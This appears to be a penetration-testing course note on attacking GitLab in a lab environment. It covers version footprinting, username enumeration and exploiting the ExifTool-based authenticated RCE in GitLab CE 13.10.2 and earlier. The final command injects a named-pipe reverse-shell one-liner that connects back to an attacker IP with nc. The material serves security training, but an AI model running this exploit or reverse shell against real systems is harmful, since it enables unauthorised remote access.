# Footprinting & Discovery
We can quickly determine that GitLab is in use in an environment by just browsing to the GitLab URL, and we will be directed to the login page, which displays the GitLab logo.

The only way to footprint the GitLab version number in use is by browsing to the /help page when logged in. If the GitLab instance allows us to register an account, we can log in and browse to this page to confirm the version.

# Enumeration
There's not much we can do against GitLab without knowing the version number or being logged in. 
The first thing we should try is browsing to /explore and see if there are any public projects that may contain something interesting. 

# Attacking GitLab
## Username Enumeration
We can write one ourselves in Bash or Python or use [this one](https://www.exploit-db.com/exploits/49821) to enumerate a list of valid users. The Python3 version of this same tool can be found [here](https://github.com/dpgg101/GitLabUserEnum).
```bash
$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```

## Authenticated Remote Code Execution
GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution vulnerability due to an issue with ExifTool handling metadata in uploaded image files.
We can use [this](https://www.exploit-db.com/exploits/49951) exploit to achieve RCE.

As this is authenticated remote code execution, we first need a valid username and password. In some instances, this would only work if we could obtain valid credentials through OSINT or a credential guessing attack. However, if we encounter a vulnerable version of GitLab that allows for self-registration, we can quickly sign up for an account and pull off the attack.
```bash
$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f'
```